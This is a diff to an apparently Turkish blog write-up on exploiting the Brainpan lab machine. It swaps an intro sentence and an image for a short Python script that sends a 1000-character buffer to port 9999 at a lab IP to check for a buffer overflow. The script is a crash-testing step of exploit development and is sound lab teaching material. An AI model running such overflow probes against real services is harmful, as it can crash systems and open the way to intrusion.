@@ -38,11 +38,8 @@ Hedef makina ile 9999 portu üzerinden bağlantı kuruyoruz.
     <img src="/assets/img/brainpan4.png">
 </figure>
 
-Uygulamanın kullanıcıdan input alıyor olması ve ve statik analizde karşılaşılan strcpy gibi fonksiyonlar ilk olarak buffer overflow zafiyetini hatırlatıyor. Daha ayrıntılı incelemeye Windows 7 işletim sistemi üzerinde devam ediyoruz. İncelemeye başlamadan önce buffer overflow zafiyetinin ne olduğu, nasıl exploit edildiğine değinelim.
+Uygulamanın kullanıcıdan input alıyor olması ve ve statik analizde karşılaşılan strcpy gibi fonksiyonlar ilk olarak buffer overflow zafiyetini hatırlatıyor. Daha ayrıntılı incelemeye Windows 7 işletim sistemi üzerinde devam ediyoruz. 
 
-<figure >
-    <img src="/assets/img/bof1.png">
-</figure>
 
 Uygulamayı Immunity Debugger içerisinde açıp, çalıştırıyoruz. 
 
@@ -50,12 +47,22 @@ Uygulamayı Immunity Debugger içerisinde açıp, çalıştırıyoruz.
     <img src="/assets/img/brainpan6.PNG">
 </figure>
 
-
-
-
-
+Öncelikle bir overflow olup olmadığı tespit ediyoruz. Bunun için başlangıç olarak 1000 karakter boyutunda bir input gönderiyoruz.
 
 {% highlight python %}
+
+#!/usr/bin/python
+
+import socket
+import sys
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+connect=s.connect(('172.16.198.137',9999))
+
+buffer="A"*1000
+
+s.recv(1024)
+s.send(buffer)
 
 {% endhighlight %}
 
